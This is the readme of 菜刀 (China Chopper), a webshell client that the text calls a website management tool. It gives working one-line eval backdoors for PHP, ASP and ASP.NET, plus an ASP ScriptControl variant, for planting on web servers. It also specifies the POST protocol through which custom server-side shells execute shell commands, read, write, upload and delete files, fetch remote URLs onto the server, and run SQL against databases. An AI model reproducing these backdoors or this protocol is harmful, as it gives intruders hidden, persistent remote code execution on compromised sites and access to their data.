菜刀 / Caidao @ http://www.maicaidao.com/
-------------------------------------------
     菜刀，他是一款专业的网站管理工具
-------------------------------------------

一、网站管理模块
----------------

    放在网站上的脚本程序分两种：

　　1）“一句话(Eval)”：
	PHP, ASP, ASP.NET 的网站都可以，支持https。下面的代码放在网站目录即可开始管理，比FTP好用多了是不是：
　　	PHP:    <?php @eval($_POST['caidao']);?>
　　	ASP:    <%eval request("caidao")%>
　　	ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["caidao"],"unsafe");%>

    2）自己开发的脚本程序(Customize)：

	理论上支持所有动态脚本,只要正确与菜刀进行交互即可。调用方法请参阅后面的 “Customize模式菜刀和服务端通信接口”。


    ---------------------------------------------------------------------------------------------------------

	
　　常用功能介绍

　　	1. 文件管理：[特色]缓存下载目录，并支持离线查看缓存目录;

　　	2. 虚拟终端：[特色]人性化的设计，操作方便;(输入HELP查看更多用法), 超长命令会分割为5k字节一份，分别提交。

　　	3. 数据库管理：[特色]图形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,POSTGRESQL,ACCESS, 以及支持ADO方式连接的数据库。

   	4. 自写脚本（只有Eval端才支持）：

		通过简单编码后提交用户自己的脚本到服务端执行，实现丰富的功能，也可选择发送到浏览器执行。

		如果要写自己的CCC脚本，可以参考一下CCC目录下的示例代码, 相信你也可以写出功能丰富的脚本。

		可以在官网下载别人的CCC脚本，或分享你的得意之作。


　　配置框填写说明

	----------------
	A)  数据库相关：
	----------------
	PHP：
	<T>类型</T> 类型可为MYSQL,MSSQL,ORACLE,INFOMIX,POSTGRESQL中的一种
	<H>主机地址<H> 主机地址可为机器名或IP地址，如localhost
	<U>数据库用户</U> 连接数据库的用户名，如root
	<P>数据库密码</P> 连接数据库的密码，如123455
	<N>默认库</N> 默认连接的库名

	<L>utf8</L> 这一项数据库类型为MYSQL脚本为PHP时可选，不填则为latin1

	ASP 和 ASP.NET：
	<T>类型</T> 类型只能填ADO
	<C>ADO配置信息</C>
	ADO连接各种数据库的方式不一样。如MSSQL的配置信息为
		Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456;

	Customize：
	<T>类型</T> 类型只能填XDB
	<X>与Customize 脚本约定的配置信息</X>
	菜刀自带的Customize.jsp数据库参数填写方法如下(两行)：
	MSSQL:
		<X>
		com.microsoft.sqlserver.jdbc.SQLServerDriver
		jdbc:sqlserver://127.0.0.1:1433;databaseName=test;user=sa;password=123456
		</X>
	MYSQL:
		<X>
		com.mysql.jdbc.Driver
		jdbc:mysql://localhost/test?user=root&password=123456
		</X>
	ORACLE:
		<X>
		oracle.jdbc.driver.OracleDriver
		jdbc:oracle:thin:user/password@127.0.0.1:1521/test
		</X>

	-------------
	B) 其它配置：
	-------------

	添加额外附加提交的数据，如ASP的新服务端是这样的：
	<%
	Set o = Server.CreateObject("ScriptControl")
	o.language = "vbscript"
	o.addcode(Request("SC"))
	o.run "ff",Server,Response,Request,Application,Session,Error
	%>
	那么，菜刀在配置处填入：
	<O>SC=function+ff(Server,Response,Request,Application,Session,Error):eval(request("caidao")):end+function</O>
	然后以密码caidao来连接即可。

	默认终端程序路径设置示例：
	<SHELL>/bin/sh</SHELL>

	虚拟终端默认命令设置示例：
	<CMD>whoami</CMD>

	文件管理默认打开的目录设置示例：
	<CD>c:\windows\temp\</CD>


　　如果你网站开通了HTTP登录验证，可以这样填地址：

	http://user:pass@maicaidao.com/admin.asp
	用户名密码中的特殊字符可用URL编码转换。


    【20160620后的版本多了个文件caidao.conf】

     这个文件是必须有的，里面的各节点一个也不能删，不然程序运行会出错！
     默认调用的是caidao.conf，菜单里有个“加载配置文件”的菜单项，可以切换配置文件。
     这个文件必段存为UNICODE编码！
     各节点简单介绍一下：
	<FLAG>	返回的内容分隔符，只限三个字符，用生辟点的字符吧。
	<UA>	自定义User-Agent的值
	<K1>	POST的第一个参数名称，不再是原版本固定的z1
	<K2>	同上

	<PHP_BASE>	这是PHP脚本的基本代码，其它的功能代码最终会传到这里面，注意里面的%s %d这样的参数
	<ASP_BASE>	同上
	<ASPX_BASE>	同上
	<PHP_BASE.加密示例>	这个不会用到，如果临时复制出来一个节点，可以取一个不同的节点名字，不要重名了。
		这里示范的是如何把PHP_BASE的内容加密发送。
		相信你会做得更好。
	<GETBASEINFO>
	<SHOWFOLDER>
	<SHOWTXTFILE>
	<SAVETXTFILE>
	<DELETEFILE>
	<DOWNFILE>
	<UPLOADFILE>
	<PASTEFILE>
	<NEWFOLDER>
	<WGET>
	<SHELL>
	<RENAME>
	<SETTIME>
	-----------上面这些，你懂的，就不费篇幅了
	<DB_PHP_MYSQL_DBLIST>		PHP脚本刚连接时调用这里，给出库列表
	<DB_PHP_MYSQL_TABLELIST>	点击库调用，显示数据表
	<DB_PHP_MYSQL_COLUMNLIST>	点击数据表调用，显示数据表字段
	<DB_PHP_MYSQL_EXECUTESQL>	执行SQL，分别处理查询和执行并给出结果。
	....
	接下来的几样都是PHP连其它库的，大同小异。
	<DB_ASP_ADO_DBLIST>
	<DB_ASP_ADO_TABLELIST>
	<DB_ASP_ADO_COLUMNLIST>
	<DB_ASP_ADO_EXECUTESQL>
	上面是ASP管理数据库的脚本，用ADO来整的。
	<DB_ASPX_ADO_DBLIST>
	<DB_ASPX_ADO_TABLELIST>
	<DB_ASPX_ADO_COLUMNLIST>
	<DB_ASPX_ADO_EXECUTESQL>
	ASPX的，当然还有其它好用的方式，看你的习惯来改了。

二、记事本
----------

	忽然觉得有个地方记录点东西还是挺方便的。


三、浏览器
----------

	就是一个专用的网页浏览器，
	Post浏览/自定义Cookies,/执行自定义脚本/自动刷新页面/同IP网页搜索。
	如果有ip.dat库，在状态栏会显示此网站的IP,国家代码。

----------         ----------
新版本去掉了一些不想用的功能，
-----------         ----------


文件说明：
------------------------------------------------------------------
caidao.exe	菜刀程序
db.mdb		菜刀的主数据库
caidao.conf	配置文件（重要，千万别删除）
------------------------------------------------------------------
cache.tmp	菜刀的缓存数据库(可删除)
readme.txt	你现在正在看的(可删除)
ip.dat		一个IP库，用于IP地址识别(可删除)
<CCC>		菜刀的自写脚本目录(可删除)
<Customize>	Customize模式的服务端(可删除)
	Customize.aspx	这是一个C#的示例服务端(全功能)
	Customize.jsp	这是一个jsp的示例服务端(全功能)
	Customize.cfm	这是一个cfm的示例服务端(文件管理，虚拟终端)






-------------------------------------
附：Customize模式菜刀和服务端通信接口
-------------------------------------

其它语言的服务端代码可按此接口来编写(请参照Customize.jsp/Customize.cfm/Customize.aspx)

例：菜刀客户端填写的密码为pass，网页编码选的是GB2312(Jsp服务端会用到此参数)
注：所有参数都以POST提交，
	返回的数据都要以配置文件caidao.conf中的FLAG节点填写的标记分隔
	提交的参数z0.z1.z2...
注：返回的错误信息开头包含ERROR:// 
注：\t代表制表符TAB，\r\n代表换行回车，\n代表回车
注：数据库配置信息是一个字符串，服务端脚本可以对此字符串格式进行自定义。
---------------------------------------------------------------------------------------

[得到当前目录的绝对路径]
提交：pass=A&z0=GB2312
返回：目录的绝对路径\t，如果是Windows系统后面接着加上驱动器列表
示例：c:\inetpub\wwwroot\	C:D:E:K:
示例：/var/www/html/	

[目录浏览]
提交：pass=B&z0=GB2312&z1=目录绝对路径
返回：先目录后文件,目录名后要加/，文件名后不要加/
示例：
	目录名/\t时间\t大小\t属性\n目录名/\t时间\t大小\t属性\n
	文件名\t时间\t大小\t属性\n文件名\t时间\t大小\t属性\n

[读取文本文件]
提交：pass=C&z0=GB2312&z1=文件绝对路径
返回：文本文件的内容

[写入文本文件]
提交：pass=D&z0=GB2312&z1=文件绝对路径&z2=文件内容
返回：成功返回1,不成功返回错误信息

[删除文件或目录]
提交：pass=E&z0=GB2312&z1=文件或目录的绝对路径
返回：成功返回1,不成功返回错误信息

[下载文件]
提交：pass=F&z0=GB2312&z1=服务器文件的绝对路径
返回：要下载文件的内容

[上传文件]
提交：pass=G&z0=GB2312&z1=文件上传后的绝对路径&z2=文件内容(十六进制文本格式)
返回：要下载文件的内容

[复制文件或目录后粘贴]
提交：pass=H&z0=GB2312&z1=复制的绝对路径&z2=粘贴的绝对路径
返回：成功返回1,不成功返回错误信息

[文件或目录重命名]
提交：pass=I&z0=GB2312&z1=原名(绝对路径)&z2=新名(绝对路径)
返回：成功返回1,不成功返回错误信息

[新建目录]
提交：pass=J&z0=GB2312&z1=新目录名(绝对路径)
返回：成功返回1,不成功返回错误信息

[修改文件或目录时间]
提交：pass=K&z0=GB2312&z1=文件或目录的绝对路径&z2=时间(格式：yyyy-MM-dd HH:mm:ss)
返回：成功返回1,不成功返回错误信息

[下载文件到服务器]
提交：pass=L&z0=GB2312&z1=URL路径&z2=下载后保存的绝对路径
返回：成功返回1,不成功返回错误信息

[执行Shell命令(Shell路径前会根据服务器系统类型加上-c或/c参数)]
提交：pass=M&z0=GB2312&z1=(-c或/c)加Shell路径&z2=Shell命令
返回：命令执行结果

[得到数据库基本信息]
提交：pass=N&z0=GB2312&z1=数据库配置信息
返回：成功返回数据库(以制表符\t分隔)， 不成功返回错误信息

[获取数据库表名]
提交：pass=O&z0=GB2312&z1=数据库配置信息\r\n数据库名
返回：成功返回数据表(以\t分隔)， 不成功返回错误信息

[获取数据表列名]
提交：pass=P&z0=GB2312&z1=数据库配置信息\r\n数据库名\r\n数据表名
返回：成功返回数据列(以制表符\t分隔)， 不成功返回错误信息

[执行数据库命令]
提交：pass=Q&z0=GB2312&z1=数据库配置信息\r\n数据库名&z2=SQL命令
返回：成功返回数据表内容， 不成功返回错误信息
注意：返回的第一行为表头，接下去每行分别在列表中显示，列数要求一致。行中的每列后加上\t|\t标记，每行以标记\r\n为结束





-------------------------------------------------------------------------------------------------------------------

















						菜刀 七岁了 感谢有你一路陪伴成长!
















										L408179


-------------------------------------------------------------------------------------------------------------------

